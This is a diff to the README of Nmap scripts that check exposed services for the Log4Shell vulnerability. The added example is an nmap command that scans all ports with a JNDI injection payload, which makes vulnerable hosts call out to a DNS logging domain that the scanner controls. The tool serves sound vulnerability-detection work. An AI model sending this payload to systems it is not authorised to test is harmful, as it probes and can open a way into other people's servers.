@@ -3,8 +3,15 @@
 Nmap NSE scripts to check against log4shell or LogJam vulnerabilities (CVE-2021-44228).
 NSE scripts check most popular exposed services on the Internet. It is basic script where you can customize payload.
 
-###
+### Examples
 
+### By help of logdns (custom DNS logging server)
+
+Go to http://github.com/kost/logdns and get DNS server. Get domain and point to the somewhere where you have installed logdns:
+
+```
+nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://{{target}}.xxxx.logdns.xxx}"' -T4 -n -p0-65535 --script-timeout=1m MY.IPs.TO.SCAN
+```
 ### By help of dnslog.cn
 
 Go to http://dnslog.cn/ and Get SubDomain. Replace your xxxx with your SubDomain:
